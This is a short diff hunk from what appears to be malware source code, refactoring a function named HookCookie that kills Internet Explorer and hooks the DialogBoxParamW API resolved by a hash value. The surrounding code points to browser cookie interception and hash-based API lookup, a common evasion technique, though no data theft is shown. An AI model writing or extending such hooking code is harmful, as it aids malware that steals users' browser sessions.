@@ -576,7 +576,8 @@ bool HookCookie()
 	Kill_IE();
 	
 	UnhookCookie();
-	if ( HookApi( 3, 0x929A0EB1, &Hook_DialogBoxParamW ) )
+	const DWORD HASH_DialogBoxParamW = 0x929A0EB1;
+	if ( HookApi( DLL_USER32, HASH_DialogBoxParamW, &Hook_DialogBoxParamW ) )
 	{  
 		__asm mov [Real_DialogBoxParamW], eax			
 	}	
